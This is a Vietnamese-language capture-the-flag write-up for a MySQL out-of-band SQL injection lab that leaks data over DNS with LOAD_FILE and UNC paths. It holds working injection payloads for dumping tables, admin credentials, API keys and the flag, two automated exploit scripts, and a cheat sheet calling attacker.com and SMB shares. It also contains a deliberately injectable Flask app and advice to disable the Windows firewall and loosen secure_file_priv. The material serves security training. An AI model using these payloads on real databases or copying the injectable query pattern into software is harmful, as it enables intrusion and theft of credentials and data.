# SQLi-035: MySQL OOB DNS Exfiltration - Writeup

## Flag: `FLAG{mysql_oob_dns_unc_exfil}`

---

## ⚠️ IMPORTANT NOTICE - Lab Limitation

> **🚨 Lab này chạy MySQL trên Docker Linux - UNC path OOB KHÔNG HOẠT ĐỘNG**
>
> **Lý do:**
>
> - MySQL `LOAD_FILE()` với UNC path (`\\server\share`) CHỈ hoạt động trên **Windows**
> - Lab Docker này chạy Linux container → OOB DNS sẽ KHÔNG trigger
> - Đây là **theoretical lab** để học concept và payload structure
>
> **Để thực hành OOB thật, xem:** [🔧 Real-World Setup Guide](#-real-world-setup-guide) ở cuối writeup

---

## 🔍 Bước 1: DETECT - Phát Hiện Injection Point

### 1.1. Phân tích ứng dụng

Truy cập ứng dụng và quan sát behavior:

```bash
# Normal request
curl "http://localhost:5035/product?id=1"
# Response: "Product catalog query processed successfully."

# Test với quote
curl "http://localhost:5035/product?id=1'"
# Response: GIỐNG HỆT - không có error message!

# Test với OR 1=1
curl "http://localhost:5035/product?id=1 OR 1=1"
# Response: VẪN GIỐNG - không có difference!
```

### 1.2. Nhận định

- Response **luôn giống nhau** dù query đúng hay sai
- Không có error messages
- Boolean-based blind sẽ **KHÔNG HOẠT ĐỘNG**
- Cần thử Time-based hoặc OOB

### 1.3. Test Time-based

```bash
# Thử SLEEP
time curl "http://localhost:5035/product?id=1 AND SLEEP(3)-- -"
# Response time: ~3s+ → Có thể time-based, NHƯNG...
```

**Nhưng** trong scenario này, network latency không ổn định hoặc time-based bị giới hạn. OOB là lựa chọn tốt hơn **TRÊN WINDOWS**.

**💡 Note:** Lab Docker này chạy Linux nên OOB không work. Các bước dưới đây là **theoretical** cho Windows MySQL. Xem [Real-World Setup](#-real-world-setup-guide) để test thật.

---

## 🎯 Bước 2: IDENTIFY - Xác Định DBMS

### 2.1. Thông tin từ frontend

Trang web hiển thị:

- `Server: Windows Server 2019`
- `Database: MySQL 8.0`
- `FILE_PRIV: ON`
- `secure_file_priv: NULL`

→ **MySQL trên Windows** với **FILE privilege enabled** = Perfect cho OOB!

### 2.2. Confirm MySQL bằng OOB

Setup listener trước:

**Burp Suite Collaborator:**

1. Burp → Collaborator client
2. Copy Collaborator URL: `xxxxx.burpcollaborator.net`

**Hoặc interactsh:**

```bash
interactsh-client
# Output: xxx.oast.fun
```

---

## 🔧 Bước 3: ENUMERATE - Setup và Test OOB

**⚠️ IMPORTANT:** Các payload dưới đây CHỈ hoạt động trên **Windows MySQL**. Lab Docker này chạy Linux nên sẽ không thấy DNS callback.

### 3.1. Test basic OOB với Burp Collaborator

**Payload để test DNS lookup:**

```http
GET /product?id=1 AND LOAD_FILE('\\\\xxxxx.burpcollaborator.net\\test') HTTP/1.1
Host: localhost:5035
```

**URL encoded:**

```
http://localhost:5035/product?id=1%20AND%20LOAD_FILE(%27\\\\xxxxx.burpcollaborator.net\\test%27)
```

**Burp Repeater:**

1. Capture request với Burp Proxy
2. Send to Repeater
3. Modify payload:
   ```
   GET /product?id=1 AND LOAD_FILE(CONCAT('\\\\\\\\','test','.xxxxx.burpcollaborator.net\\\\a')) HTTP/1.1
   ```
4. Send request
5. Check Collaborator → **DNS lookup received!** ✅

### 3.2. Giải thích syntax UNC path

```sql
-- MySQL cần escape backslash 2 lần
LOAD_FILE('\\\\attacker.com\\share')
-- Trong URL: cần encode thêm 1 lần nữa
```

**Escape levels:**

- SQL string: `\\\\` → `\\`
- Actual path: `\\attacker.com\share`

---

## 📊 Bước 4: EXTRACT - Trích Xuất Dữ Liệu

### 4.1. Extract database name

**Payload:**

```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxxxx.burpcollaborator.net\\a'))
```

**Burp Repeater:**

```http
GET /product?id=1%20AND%20LOAD_FILE(CONCAT(%27\\\\\\\\%27,(SELECT%20database()),%27.xxxxx.burpcollaborator.net\\\\a%27)) HTTP/1.1
Host: localhost:5035
```

**Collaborator result:**

```
DNS lookup: corpdb.xxxxx.burpcollaborator.net
```

→ Database: **corpdb**

### 4.2. Extract table names

```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))
```

**Iterate với LIMIT để lấy từng table:**

| LIMIT | DNS Lookup                           | Table Name  |
| ----- | ------------------------------------ | ----------- |
| 0,1   | admin_users.xxx.burpcollaborator.net | admin_users |
| 1,1   | api_keys.xxx.burpcollaborator.net    | api_keys    |
| 2,1   | flags.xxx.burpcollaborator.net       | flags       |
| 3,1   | products.xxx.burpcollaborator.net    | products    |

→ Found table: **flags** 🎯

### 4.3. Extract column names từ flags table

```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flags' LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))
```

| LIMIT | DNS Lookup                     | Column Name |
| ----- | ------------------------------ | ----------- |
| 0,1   | id.xxx.burpcollaborator.net    | id          |
| 1,1   | name.xxx.burpcollaborator.net  | name        |
| 2,1   | value.xxx.burpcollaborator.net | value       |

→ Target column: **value**

---

## 📤 Bước 5: ESCALATE (Optional)

Trong lab này, không cần escalate privileges vì đã có FILE privilege.

**Có thể extract thêm:**

- Admin passwords
- API keys
- Sensitive configs

### 5.1. Extract admin credentials

```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT CONCAT(username,'-',password) FROM admin_users LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))
```

**DNS Lookup:**

```
sysadmin-Sys@dm1n_S3cur3!.xxx.burpcollaborator.net
```

### 5.2. Extract API keys

```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT CONCAT(service_name,'-',api_key) FROM api_keys LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))
```

---

## 🏆 Bước 6: EXFILTRATE - Lấy Flag

### 6.1. Extract flag value

**Payload:**

```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT value FROM flags LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))
```

**Burp Repeater request:**

```http
GET /product?id=1%20AND%20LOAD_FILE(CONCAT(%27\\\\\\\\%27,(SELECT%20value%20FROM%20flags%20LIMIT%200,1),%27.xxxxx.burpcollaborator.net\\\\a%27)) HTTP/1.1
Host: localhost:5035
```

### 6.2. Check Collaborator

**DNS interaction received:**

```
Type: DNS
Domain: FLAG{mysql_oob_dns_unc_exfil}.xxxxx.burpcollaborator.net
Time: 2026-01-03 21:45:00
```

🎉 **FLAG:** `FLAG{mysql_oob_dns_unc_exfil}`

---

## 🛠️ Handling Special Characters

### Vấn đề: DNS labels không hỗ trợ một số ký tự

DNS labels chỉ cho phép: `a-z`, `0-9`, `-`

**Giải pháp: Hex encoding**

```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(value) FROM flags LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))
```

**DNS Lookup:**

```
464C41477B6D7973716C5F6F6F625F646E735F756E635F657866696C7D.xxx.burpcollaborator.net
```

**Decode hex:**

```python
>>> bytes.fromhex('464C41477B6D7973716C5F6F6F625F646E735F756E635F657866696C7D').decode()
'FLAG{mysql_oob_dns_unc_exfil}'
```

### Vấn đề: Data quá dài (DNS label max 63 chars)

**Giải pháp: SUBSTRING**

```sql
-- Chunk 1 (chars 1-60)
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT SUBSTRING(HEX(value),1,60) FROM flags LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))

-- Chunk 2 (chars 61-120)
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT SUBSTRING(HEX(value),61,60) FROM flags LIMIT 0,1),'.xxxxx.burpcollaborator.net\\a'))
```

---

## 🤖 Automated Exploit Script

```python
#!/usr/bin/env python3
"""SQLi-035: MySQL OOB DNS Exfiltration Exploit"""

import requests
import time
import subprocess
import threading
import re

# Configuration
TARGET_URL = "http://localhost:5035/product"
# Replace with your Collaborator/interactsh domain
OOB_DOMAIN = "xxxxx.burpcollaborator.net"

def send_oob_payload(query):
    """Send OOB payload via LOAD_FILE"""
    # Build payload with proper escaping
    payload = f"1 AND LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{OOB_DOMAIN}\\\\a'))"

    try:
        r = requests.get(TARGET_URL, params={"id": payload}, timeout=10)
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def extract_with_hex(query):
    """Extract data using HEX encoding for special chars"""
    hex_query = f"HEX(({query}))"
    payload = f"1 AND LOAD_FILE(CONCAT('\\\\\\\\',({hex_query}),'.{OOB_DOMAIN}\\\\a'))"

    try:
        r = requests.get(TARGET_URL, params={"id": payload}, timeout=10)
        print(f"[*] Sent payload. Check your OOB listener for DNS lookup.")
        print(f"[*] Decode HEX result with: bytes.fromhex('...').decode()")
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    print("=" * 60)
    print("SQLi-035: MySQL OOB DNS Exfiltration")
    print("=" * 60)
    print(f"\n[*] Target: {TARGET_URL}")
    print(f"[*] OOB Domain: {OOB_DOMAIN}")
    print("\n[!] Make sure you're monitoring your OOB listener!")
    print("-" * 60)

    # Step 1: Extract database name
    print("\n[1] Extracting database name...")
    send_oob_payload("SELECT database()")
    time.sleep(2)

    # Step 2: Extract table names
    print("\n[2] Extracting table names...")
    for i in range(5):
        print(f"    [*] Table {i+1}...")
        send_oob_payload(f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1")
        time.sleep(1)

    # Step 3: Extract flag
    print("\n[3] Extracting flag from 'flags' table...")
    send_oob_payload("SELECT value FROM flags LIMIT 0,1")
    time.sleep(2)

    # Step 4: Extract with HEX encoding (for special chars)
    print("\n[4] Extracting flag with HEX encoding...")
    extract_with_hex("SELECT value FROM flags LIMIT 0,1")

    print("\n" + "=" * 60)
    print("[*] Payloads sent! Check your OOB listener for DNS lookups.")
    print("[*] Expected flag: FLAG{mysql_oob_dns_unc_exfil}")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

### Script Output Example:

```
============================================================
SQLi-035: MySQL OOB DNS Exfiltration
============================================================

[*] Target: http://localhost:5035/product
[*] OOB Domain: xxxxx.burpcollaborator.net

[!] Make sure you're monitoring your OOB listener!
------------------------------------------------------------

[1] Extracting database name...
[2] Extracting table names...
    [*] Table 1...
    [*] Table 2...
    [*] Table 3...
    [*] Table 4...
    [*] Table 5...
[3] Extracting flag from 'flags' table...
[4] Extracting flag with HEX encoding...

============================================================
[*] Payloads sent! Check your OOB listener for DNS lookups.
[*] Expected flag: FLAG{mysql_oob_dns_unc_exfil}
============================================================
```

---

## 📊 Summary

| Step          | Action                                         | Result                           |
| ------------- | ---------------------------------------------- | -------------------------------- |
| 1. DETECT     | Test injection, observe response behavior      | Response always same - need OOB  |
| 2. IDENTIFY   | Check frontend hints, confirm MySQL on Windows | MySQL 8.0 với FILE privilege     |
| 3. ENUMERATE  | Setup Collaborator, test OOB with LOAD_FILE    | DNS lookups working              |
| 4. EXTRACT    | Get database, tables, columns via OOB          | Found flags.value                |
| 5. ESCALATE   | N/A                                            | FILE privilege already available |
| 6. EXFILTRATE | Extract flag value via DNS                     | FLAG{mysql_oob_dns_unc_exfil}    |

---

## 🔗 Key Techniques

### OOB Payloads Summary

```sql
-- Basic OOB test
1 AND LOAD_FILE('\\\\attacker.com\\a')

-- Extract database
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))

-- Extract table names
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),'.attacker.com\\a'))

-- Extract data with HEX encoding
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 0,1),'.attacker.com\\a'))
```

### Requirements

- MySQL on Windows
- FILE privilege enabled
- `secure_file_priv` = NULL hoặc empty
- Network egress cho DNS

---

## ⚠️ Real-World Considerations

1. **Windows only**: UNC path LOAD_FILE chỉ work trên Windows
2. **FILE privilege**: Cần được grant cho user
3. **Firewall**: Một số env block outbound DNS từ DB server
4. **Rate limiting**: Real targets có thể có rate limiting

---

## � Real-World Setup Guide

### Lab hiện tại (Docker) KHÔNG hỗ trợ OOB vì chạy Linux. Để test thật:

---

## 🔍 Bước 0: Kiểm Tra MySQL Hiện Có

### 0.1. Check MySQL đã cài chưa

```powershell
# Kiểm tra MySQL service
Get-Service -Name MySQL* | Select-Object Name, Status, DisplayName

# Hoặc
sc query | findstr /i "mysql"

# Kiểm tra MySQL trong PATH
mysql --version

# Kiểm tra port 3306
netstat -ano | findstr :3306
```

**Output mong muốn:**

```
Name      Status  DisplayName
----      ------  -----------
MySQL80   Running MySQL80

mysql  Ver 8.0.35 for Win64 on x86_64
```

### 0.2. Kiểm tra phiên bản MySQL

```powershell
# Method 1: Command line
mysql --version

# Method 2: Login và check
mysql -u root -p
```

Sau khi login MySQL:

```sql
SELECT VERSION();
-- Output: 8.0.35 (hoặc version khác)

SELECT @@version;

SHOW VARIABLES LIKE "%version%";
```

**✅ Tương thích:**

- MySQL 5.7.x ✅
- MySQL 8.0.x ✅ (Khuyến nghị)
- MySQL 5.6 trở xuống ⚠️ (Có thể work nhưng không optimal)

**❌ KHÔNG tương thích:**

- MariaDB (syntax khác một chút)
- PostgreSQL (hoàn toàn khác)

### 0.3. Kiểm tra FILE privilege support

```sql
-- Login MySQL
mysql -u root -p

-- Check FILE privilege của root
SELECT User, Host, File_priv FROM mysql.user WHERE User='root';
```

**Output:**

```
+------+-----------+-----------+
| User | Host      | File_priv |
+------+-----------+-----------+
| root | localhost | Y         |
+------+-----------+-----------+
```

Nếu `File_priv = 'N'` → Cần grant:

```sql
GRANT FILE ON *.* TO 'root'@'localhost';
FLUSH PRIVILEGES;
```

### 0.4. Kiểm tra secure_file_priv

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Kết quả:**

- `NULL` = ✅ Perfect! Có thể load file từ anywhere
- `` (empty) = ✅ OK, có thể load file
- `C:\ProgramData\MySQL\...` = ❌ Bị giới hạn, cần fix

**Fix secure_file_priv:**

1. Tìm file `my.ini` (config file):

```powershell
# Tìm my.ini location
Get-Service MySQL* | Select-Object Name | ForEach-Object {
    sc qc $_.Name
}

# Thường ở:
# C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
# C:\Program Files\MySQL\MySQL Server 8.0\my.ini
```

2. Edit `my.ini` (mở as Administrator):

```ini
[mysqld]
# Comment out hoặc set = empty
secure_file_priv=""
# Hoặc
# secure_file_priv=
```

3. Restart MySQL service:

```powershell
# Stop
net stop MySQL80

# Start
net start MySQL80

# Hoặc dùng services.msc
```

4. Verify:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- Should show: NULL hoặc empty
```

---

## ⚙️ Cách 1: Setup MySQL trên Windows VM (CHI TIẾT)

### Bước 1: Cài đặt MySQL (Nếu chưa có)

### Bước 1: Cài đặt MySQL (Nếu chưa có)

**Option A: MySQL Installer (Khuyến nghị cho beginners)**

```powershell
# 1. Download MySQL Installer
# https://dev.mysql.com/downloads/installer/

# 2. Run installer → Chọn "Developer Default"
# 3. Set root password: rootpass123 (hoặc bất kỳ)
# 4. Finish installation
```

**Option B: Chocolatey**

```powershell
# Install Chocolatey nếu chưa có
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

# Install MySQL
choco install mysql -y

# Start service
net start MySQL80
```

**Option C: Manual ZIP**

```powershell
# Download ZIP: https://dev.mysql.com/downloads/mysql/
# Extract to C:\mysql
# Initialize: mysqld --initialize-insecure
# Install service: mysqld --install
```

### Bước 2: Tạo Database và Test Data

```sql
-- Login as root
mysql -u root -p

-- Tạo database
CREATE DATABASE oob_test;
USE oob_test;

-- Tạo table products
CREATE TABLE products (
    id INT PRIMARY KEY,
    name VARCHAR(100),
    price DECIMAL(10,2)
);

-- Insert test data
INSERT INTO products VALUES
(1, 'Laptop', 999.99),
(2, 'Mouse', 29.99),
(3, 'Keyboard', 79.99);

-- Tạo table flags (để test OOB)
CREATE TABLE flags (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50),
    value VARCHAR(100)
);

INSERT INTO flags (name, value) VALUES
('oob_flag', 'FLAG{mysql_oob_dns_unc_exfil}');

-- Verify
SELECT * FROM products;
SELECT * FROM flags;
```

### Bước 3: Tạo User với FILE Privilege

```sql
-- Tạo webapp user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'webpass123';

-- Grant privileges
GRANT SELECT ON oob_test.* TO 'webapp'@'localhost';
GRANT FILE ON *.* TO 'webapp'@'localhost';  -- CRITICAL!
FLUSH PRIVILEGES;

-- Verify FILE privilege
SELECT User, Host, File_priv FROM mysql.user WHERE User='webapp';
-- Should show File_priv = 'Y'
```

### Bước 4: Configure secure_file_priv (Nếu cần)

```sql
-- Check current value
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Nếu không phải NULL/empty, fix như sau:**

1. **Tìm my.ini:**

```powershell
# Method 1
Get-ChildItem -Path "C:\ProgramData\MySQL\" -Recurse -Filter "my.ini"

# Method 2
Get-ChildItem -Path "C:\Program Files\MySQL\" -Recurse -Filter "my.ini"

# Common locations:
# C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
```

2. **Edit my.ini (Run as Administrator):**

```powershell
# Mở Notepad as Admin
Start-Process notepad "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini" -Verb RunAs
```

3. **Thêm/sửa trong section [mysqld]:**

```ini
[mysqld]
secure_file_priv=""
```

4. **Restart MySQL:**

```powershell
net stop MySQL80
net start MySQL80
```

5. **Verify:**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- Value should be: NULL or empty string
```

### Bước 5: Tạo Vulnerable Web Application

**Tạo folder project:**

```powershell
mkdir C:\oob_lab
cd C:\oob_lab
```

**Tạo file `app.py`:**

```python
#!/usr/bin/env python3
"""Vulnerable Web App for MySQL OOB Testing"""
from flask import Flask, request, render_template_string
import pymysql
import sys

app = Flask(__name__)

DB_CONFIG = {
    'host': 'localhost',
    'user': 'webapp',
    'password': 'webpass123',
    'database': 'oob_test',
    'charset': 'utf8mb4'
}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>OOB SQLi Test Lab</title>
    <style>
        body {
            font-family: Arial;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin: 20px 0;
        }
        h1 { color: #333; }
        .hint {
            background: #fff3cd;
            padding: 15px;
            border-left: 4px solid #ffc107;
            margin: 20px 0;
        }
        a {
            color: #007bff;
            text-decoration: none;
            padding: 5px 10px;
        }
        a:hover { background: #e7f3ff; }
        code {
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <h1>🔒 MySQL OOB SQLi Test Lab</h1>

    <div class="hint">
        <strong>💡 Hint:</strong> Response luôn giống nhau. Thử OOB exfiltration!<br>
        <code>FILE privilege: ON</code> | <code>secure_file_priv: NULL</code>
    </div>

    <div class="box">
        <h3>Product List:</h3>
        <a href="?id=1">Product 1</a> |
        <a href="?id=2">Product 2</a> |
        <a href="?id=3">Product 3</a>
    </div>

    <div class="box">
        <p style="color: green; text-align: center; font-size: 18px;">
            ✅ Query processed successfully
        </p>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    pid = request.args.get('id', '1')

    try:
        conn = pymysql.connect(**DB_CONFIG)
        cursor = conn.cursor()

        # VULNERABLE SQL INJECTION!
        sql = f"SELECT name, price FROM products WHERE id = {pid}"

        print(f"[DEBUG] SQL: {sql}", flush=True)

        cursor.execute(sql)
        result = cursor.fetchone()

        cursor.close()
        conn.close()

    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}", flush=True)

    # Always return same response - OOB required!
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    print("="*60)
    print("🚀 Starting MySQL OOB SQLi Lab")
    print("="*60)
    print(f"[*] Database: {DB_CONFIG['database']}")
    print(f"[*] Server: http://localhost:5000")
    print("[*] Press Ctrl+C to stop")
    print("="*60)

    app.run(host='0.0.0.0', port=5000, debug=True)
```

**Cài đặt dependencies:**

```powershell
# Install Python packages
pip install flask pymysql
```

**Chạy app:**

```powershell
python app.py
```

**Test truy cập:**

```powershell
# Mở browser
start http://localhost:5000/?id=1
```

### Bước 6: Setup OOB Listener

### Bước 6: Setup OOB Listener

**Option A: Burp Suite Collaborator (Khuyến nghị)**

```
1. Mở Burp Suite Professional
2. Burp → Burp Collaborator client
3. Click "Copy to clipboard"
4. Paste vào notepad: xxxxx.burpcollaborator.net
```

**Option B: Interactsh (Free & Open Source)**

```powershell
# Install Go nếu chưa có
choco install golang -y

# Install interactsh-client
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Add Go bin to PATH
$env:Path += ";$env:USERPROFILE\go\bin"

# Run interactsh
interactsh-client

# Output:
# [INF] Listing 1 payload for OOB Testing
# [INF] c58bqt3smh5jc0fvd8q0.oast.fun
```

**Copy domain:** `c58bqt3smh5jc0fvd8q0.oast.fun`

**Keep terminal open** để nhận DNS callbacks!

### Bước 7: Test OOB với Burp Suite

#### 7.1. Configure Burp Proxy

```
1. Burp → Proxy → Options
2. Bind to address: 127.0.0.1:8080
3. Browser → Set proxy: 127.0.0.1:8080
```

#### 7.2. Test Basic OOB

**Burp Repeater:**

1. Browse to `http://localhost:5000/?id=1`
2. Intercept request → Right-click → "Send to Repeater"
3. Trong Repeater, sửa URL:

```http
GET /?id=1 AND LOAD_FILE('\\\\YOUR_DOMAIN.oast.fun\\test') HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0
```

**URL encode** (Important!):

```http
GET /?id=1%20AND%20LOAD_FILE(%27\\\\YOUR_DOMAIN.oast.fun\\test%27) HTTP/1.1
```

4. Click **Send**
5. Check **Interactsh terminal** hoặc **Burp Collaborator**

**Expected output:**

```
[INF] [dns] Received DNS interaction for test.c58bqt3smh5jc0fvd8q0.oast.fun
```

✅ **OOB working!**

#### 7.3. Extract Database Name

**Payload:**

```http
GET /?id=1 AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.YOUR_DOMAIN.oast.fun\\\\a')) HTTP/1.1
```

**URL encoded:**

```http
GET /?id=1%20AND%20LOAD_FILE(CONCAT(%27\\\\\\\\%27,database(),%27.YOUR_DOMAIN.oast.fun\\\\a%27)) HTTP/1.1
Host: localhost:5000
```

**Interactsh output:**

```
[INF] [dns] Received DNS for oob_test.c58bqt3smh5jc0fvd8q0.oast.fun
```

→ Database: **oob_test** 🎯

#### 7.4. Extract Flag

**Payload:**

```http
GET /?id=1 AND LOAD_FILE(CONCAT('\\\\\\\\',REPLACE((SELECT value FROM flags),'{','-'),'.',REPLACE('YOUR_DOMAIN.oast.fun','_','-'),'\\\\a')) HTTP/1.1
```

**Simplified payload (if flag format allows):**

```http
GET /?id=1%20AND%20LOAD_FILE(CONCAT(%27\\\\\\\\%27,(SELECT%20value%20FROM%20flags),%27.YOUR_DOMAIN.oast.fun\\\\a%27)) HTTP/1.1
```

**Interactsh output:**

```
[INF] [dns] Received DNS for FLAG{mysql_oob_dns_unc_exfil}.c58bqt3smh5jc0fvd8q0.oast.fun
```

🎉 **FLAG extracted!**

### Bước 8: Automated Testing Script

**Tạo file `oob_exploit.py`:**

```python
#!/usr/bin/env python3
"""Automated MySQL OOB Exfiltration Script"""
import requests
import time
import sys

# CONFIG
TARGET_URL = "http://localhost:5000/"
OOB_DOMAIN = "YOUR_DOMAIN.oast.fun"  # Replace!

def send_oob(query, label=""):
    """Send OOB payload and log"""
    # Build CONCAT payload with proper escaping
    payload = f"1 AND LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{OOB_DOMAIN}\\\\a'))"

    print(f"\n[*] Sending: {label}")
    print(f"[>] Query: {query}")

    try:
        r = requests.get(TARGET_URL, params={"id": payload}, timeout=5)
        print(f"[✓] Request sent (Status: {r.status_code})")
        print(f"[!] Check your OOB listener for DNS callback")
        return True
    except Exception as e:
        print(f"[✗] Error: {e}")
        return False

def main():
    print("="*70)
    print("MySQL OOB DNS Exfiltration - Automated Script")
    print("="*70)
    print(f"Target: {TARGET_URL}")
    print(f"OOB Domain: {OOB_DOMAIN}")
    print("\n[!] Make sure your OOB listener (interactsh/Collaborator) is running!")
    print("="*70)

    input("\nPress Enter to start...")

    # Test 1: Basic connectivity
    print("\n" + "─"*70)
    print("TEST 1: Basic OOB Test")
    print("─"*70)
    send_oob("'test'", "Basic string test")
    time.sleep(2)

    # Test 2: Database version
    print("\n" + "─"*70)
    print("TEST 2: MySQL Version")
    print("─"*70)
    send_oob("VERSION()", "Extract MySQL version")
    time.sleep(2)

    # Test 3: Database name
    print("\n" + "─"*70)
    print("TEST 3: Database Name")
    print("─"*70)
    send_oob("database()", "Extract database name")
    time.sleep(2)

    # Test 4: Current user
    print("\n" + "─"*70)
    print("TEST 4: Current User")
    print("─"*70)
    send_oob("user()", "Extract current user")
    time.sleep(2)

    # Test 5: Extract flag
    print("\n" + "─"*70)
    print("TEST 5: Extract Flag")
    print("─"*70)
    send_oob("SELECT value FROM flags LIMIT 0,1", "Extract flag value")
    time.sleep(2)

    # Test 6: Extract with HEX encoding
    print("\n" + "─"*70)
    print("TEST 6: Flag with HEX Encoding")
    print("─"*70)
    send_oob("HEX((SELECT value FROM flags LIMIT 0,1))", "HEX encoded flag")

    print("\n" + "="*70)
    print("All payloads sent! Check your OOB listener for DNS callbacks.")
    print("="*70)
    print("\nTo decode HEX:")
    print("  Python: bytes.fromhex('...').decode()")
    print("  Online: https://www.rapidtables.com/convert/number/hex-to-ascii.html")

if __name__ == "__main__":
    if "YOUR_DOMAIN" in OOB_DOMAIN:
        print("\n[!] ERROR: Please replace 'YOUR_DOMAIN.oast.fun' with your actual OOB domain!")
        print("[!] Get one from: interactsh-client or Burp Collaborator")
        sys.exit(1)

    main()
```

**Chạy script:**

```powershell
# Edit OOB_DOMAIN trong script trước
python oob_exploit.py
```

**Expected output:**

```
======================================================================
MySQL OOB DNS Exfiltration - Automated Script
======================================================================
Target: http://localhost:5000/
OOB Domain: c58bqt3smh5jc0fvd8q0.oast.fun

[!] Make sure your OOB listener (interactsh/Collaborator) is running!
======================================================================

Press Enter to start...

──────────────────────────────────────────────────────────────────────
TEST 1: Basic OOB Test
──────────────────────────────────────────────────────────────────────
[*] Sending: Basic string test
[>] Query: 'test'
[✓] Request sent (Status: 200)
[!] Check your OOB listener for DNS callback
...
```

### Bước 9: Verify Results

**Check Interactsh output:**

```
[INF] [dns] test.c58bqt3smh5jc0fvd8q0.oast.fun
[INF] [dns] 8.0.35.c58bqt3smh5jc0fvd8q0.oast.fun
[INF] [dns] oob_test.c58bqt3smh5jc0fvd8q0.oast.fun
[INF] [dns] webapp@localhost.c58bqt3smh5jc0fvd8q0.oast.fun
[INF] [dns] FLAG{mysql_oob_dns_unc_exfil}.c58bqt3smh5jc0fvd8q0.oast.fun
```

✅ **Success! OOB exfiltration working!**

---

### Cách 2: Dùng Vulnerable Docker với Windows Containers

**⚠️ Requires:** Docker Desktop on Windows với Windows containers enabled

```dockerfile
# Dockerfile - Windows MySQL container
FROM mcr.microsoft.com/windows/servercore:ltsc2019

# Install MySQL for Windows
# (Khá phức tạp - cân nhắc dùng VM thay vì container)
```

**Note:** Windows containers phức tạp hơn, khuyến nghị dùng VM.

---

### Cách 3: Cloud Lab trên AWS/Azure

**Setup EC2 Windows Instance:**

```bash
# 1. Launch Windows Server 2019 EC2
# 2. RDP vào instance
# 3. Install MySQL
# 4. Configure security group cho inbound port 80/3306
# 5. Deploy vulnerable app
# 6. Test OOB với public DNS
```

---

### Troubleshooting OOB

#### DNS không trigger:

**Check 1: FILE privilege**

```sql
SELECT * FROM mysql.user WHERE user='webapp'\G
-- Xem File_priv = 'Y'
```

**Check 2: secure_file_priv**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- Phải = "" hoặc NULL
```

**Check 3: Network connectivity**

```powershell
# Test outbound DNS
nslookup google.com

# Test specific domain
nslookup test.oast.fun
```

**Check 4: Windows Firewall**

```powershell
# Check firewall
Get-NetFirewallProfile

# Temporarily disable (for testing only!)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Check 5: MySQL error log**

```sql
SHOW VARIABLES LIKE 'log_error';
-- Check file for errors
```

---

### Payload Testing Checklist

```sql
-- ✅ Test 1: Basic LOAD_FILE
SELECT LOAD_FILE('C:\\Windows\\win.ini');

-- ✅ Test 2: UNC path to known server
SELECT LOAD_FILE('\\\\google.com\\test');

-- ✅ Test 3: OOB with CONCAT
SELECT LOAD_FILE(CONCAT('\\\\','test','.oast.fun\\a'));

-- ✅ Test 4: Data exfiltration
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.oast.fun\\a'));
```

---

### Alternative OOB Techniques (Advanced)

#### 1. Using SELECT ... INTO OUTFILE with UNC

```sql
-- Yêu cầu FILE privilege
SELECT 'test' INTO OUTFILE '\\\\attacker.com\\share\\file.txt';
```

#### 2. Using LOAD DATA INFILE

```sql
-- Trigger SMB connection
LOAD DATA INFILE '\\\\attacker.com\\share\\data.txt' INTO TABLE test;
```

#### 3. Using UDF (User Defined Function)

```sql
-- Advanced: Custom UDF để trigger network request
CREATE FUNCTION oob_exfil RETURNS STRING SONAME 'udf_oob.dll';
SELECT oob_exfil('data');
```

---
